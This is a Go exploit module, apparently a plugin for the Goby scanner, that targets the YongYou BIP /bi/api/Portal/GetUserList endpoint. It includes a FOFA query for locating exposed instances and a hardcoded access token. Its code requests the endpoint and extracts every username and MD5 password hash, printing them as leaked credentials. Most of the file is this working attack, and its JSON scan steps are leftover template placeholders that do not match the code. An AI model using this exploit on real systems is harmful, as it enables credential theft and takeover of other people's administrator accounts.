package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YongYou BIP /bi/api/Portal/GetUserList Information Disclosure Vulnerability",
    "Description": "<p>UFIDA BIP is a fusion service group with digital intelligence platform + scenario services in ten fields + large-scale ecology as the basic product form. There is information leakage in the UFIDA BIP/bi/api/Portal/GetUserList interface. Attackers can use this vulnerability to obtain information related to the administrator's account and password.</p>",
    "Product": "YongYou BIP",
    "Homepage": "https://www.yonyou.com/YonBIP/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-11-27",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/bi/portal/manifest.json\" || body=\"js/lib/ba.common.js\" && body=\"用友\"",
    "GobyQuery": "body=\"/bi/portal/manifest.json\" || body=\"js/lib/ba.common.js\" && body=\"用友\"",
    "Level": "1",
    "Impact": "<p>There is information leakage in the UFIDA BIP/bi/api/Portal/GetUserList interface. Attackers can use this vulnerability to obtain information related to the administrator's account and password.</p>",
    "Recommendation": "<p>1. Restrict interface access permissions to ensure that only authorized users can access. </p><p>2. Upgrade to the latest secure version provided by the vendor:<a href=\"https://www.yonyou.com/YonBIP/\">https://www.yonyou.com/YonBIP/</a></p>",
    "References": [
        "https://en.fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "userInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "用友BIP /bi/api/Portal/GetUserList 信息泄露漏洞",
            "Product": "用友BIP",
            "Description": "<p>用友BIP是以数智平台+十大领域的场景服务+大规模生态为基本产品形态的融合服务群。用友BIP/bi/api/Portal/GetUserList接口存在信息泄露，攻击者可利用该漏洞获取管理员的账号密码相关信息<br></p>",
            "Recommendation": "<p>1. 限制接口访问权限，确保仅授权用户可以访问。</p><p>2. 升级至厂商提供的最新安全版本：<a href=\"https://www.yonyou.com/YonBIP/\">https://www.yonyou.com/YonBIP/</a></p>",
            "Impact": "<p>用友BIP/bi/api/Portal/GetUserList接口存在信息泄露，攻击者可利用该漏洞获取管理员的账号密码相关信息<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "YongYou BIP /bi/api/Portal/GetUserList Information Disclosure Vulnerability",
            "Product": "YongYou BIP",
            "Description": "<p>UFIDA BIP is a fusion service group with digital intelligence platform + scenario services in ten fields + large-scale ecology as the basic product form. There is information leakage in the UFIDA BIP/bi/api/Portal/GetUserList interface. Attackers can use this vulnerability to obtain information related to the administrator's account and password.<br></p>",
            "Recommendation": "<p>1. Restrict interface access permissions to ensure that only authorized users can access.&nbsp;</p><p>2. Upgrade to the latest secure version provided by the vendor:<a href=\"https://www.yonyou.com/YonBIP/\">https://www.yonyou.com/YonBIP/</a></p>",
            "Impact": "<p>There is information leakage in the UFIDA BIP/bi/api/Portal/GetUserList interface. Attackers can use this vulnerability to obtain information related to the administrator's account and password.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9974"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			//生成13位的随机数
			vulURL := "/bi/api/Portal/GetUserList?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_c8e3652a822b6ad971dbd986e100aa_0601185203042"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				vulURL: "<PasswordMd5>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"userInfo": {"/bi/api/Portal/GetUserList?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_c8e3652a822b6ad971dbd986e100aa_0601185203042", "<PasswordMd5>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			//匹配账号
			regular := `<Name>([^"]+)<\/Name>`
			makeRegular := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					results = append(results, v[1])
				}
				return results, nil
			}
			output1, err := makeRegular(resp, regular)
			//匹配密码
			regular2 := `<PasswordMd5>([^"]+)<\/PasswordMd5>`
			makeRegular2 := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					results = append(results, v[1])
				}
				return results, nil
			}
			output2, err := makeRegular2(resp, regular2)
			
			expResult.Success = true
			expResult.Output = "Leaked information (password needs to be decrypted by MD5):\n"
			for o := range output1 {
				expResult.Output += "username: " + output1[o] + "\nuserpassword: " + output2[o] + "\n"
			}
			return expResult
		},
	))
}
